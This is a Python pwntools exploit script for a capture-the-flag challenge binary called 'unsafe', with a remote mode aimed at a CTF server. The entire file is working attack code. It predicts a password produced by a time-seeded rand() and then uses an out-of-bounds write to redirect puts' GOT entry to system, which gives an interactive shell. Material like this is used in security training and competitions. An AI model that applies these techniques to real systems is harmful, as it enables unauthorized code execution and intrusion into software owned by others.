#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys
import time
from ctypes import CDLL

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/unsafe"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "ctf.tcp1p.com", 1477
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null, cdll=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            # b *login+0xa9
            # b *login+0xcd
            # b *deposit+0x4a
            # b *deposit+0xae
            b *main+0x40
            """
            gdb.attach(io, gdbscript=cmd)

    age = 20
    pet_name = b"\x00"*4

    io.sendlineafter(b": ", str(age).encode())
    io.sendlineafter(b": ", pet_name)
    seed = int(time.time()) * (0 * 0xa00 + age) & 0xFF_FF_FF_FF
    cdll.srand(seed)
    current_password = cdll.rand()
    io.sendlineafter(b": ", str(current_password).encode())

    where = 0
    what = u16(b"sh")
    io.sendlineafter(b": ", str(where).encode())
    io.sendlineafter(b": ", str(what).encode())

    where = (elf.symbols["exit_message"] - elf.symbols["safes"])//8
    what = 0x2058
    io.sendlineafter(b": ", str(where).encode())
    io.sendlineafter(b": ", str(what).encode())

    where = (elf.got["puts"] - elf.symbols["safes"])//8
    what = libc.symbols["system"] - libc.symbols["puts"]
    io.sendlineafter(b": ", str(where).encode())
    io.sendlineafter(b": ", str(what).encode())

    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
    libc = ELF("./libc.so.6")
    cdll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    exploit(io, libc, cdll)
